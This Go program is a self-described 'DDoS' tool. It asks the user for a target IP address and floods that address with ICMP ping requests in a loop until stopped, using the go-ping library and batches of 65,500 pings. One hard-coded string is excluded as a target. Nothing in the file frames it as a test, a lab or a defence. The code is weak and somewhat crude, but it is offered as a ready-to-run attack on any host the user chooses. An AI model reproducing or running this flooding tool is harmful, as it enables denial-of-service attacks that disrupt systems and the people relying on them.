package main

import (
	"fmt"
	"bufio"
	"os"
	"github.com/go-ping/ping"
	"strings"
)

const (
	Prefix = "[DDoS] "
	ErrorPrefix = "[ERROR] "
)

func main() {
	fmt.Print("\x1b]0;" + Prefix + "Please type the ip that you want to DDoS..." + "\x07")
	Log("To quit press: CTRL+C")
	for {
		Log("Please type the ip that you want to DDoS...")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		ip := scanner.Text()
		if len(ip) < 7 || strings.Contains(ip, "legacyhcf") {
			Error("The ip you've provided is invalid!")
		} else {
			running := true
			stop := false
			go func() {
				Log("DDoSing the address " + ip + "...")
				for running == true {
					fmt.Print("\x1b]0;" + Prefix + "DDoSing the address ", ip, "..." + "\x07")
					err := DDoS(ip)
					if err != nil {
						Error("Oupsii! Looks like something wrong has happened, Make you sure that the ip you provided is valid.")
						os.Exit(1)
					}
				}
				stop = true
				Log("Successfully stopped the process!")
			}()
			Log("Press ENTER to stop the process!")
			scanner.Scan()
			Log("Stopping the process...")
			running = false
			for !stop {
				fmt.Print("\x1b]0;" + Prefix + "Stopping the process..." + "\x07")
			}
		}
	}
}

func DDoS(ip string) error {
	pinger, err := ping.NewPinger(ip)
	if err != nil {
		return err
	}
	pinger.Count = 65500
	pinger.Run()
	return nil
}

func Log(i string) {
	fmt.Println(Prefix + i)
}

func Error(i string) {
	Log(ErrorPrefix + i)
}
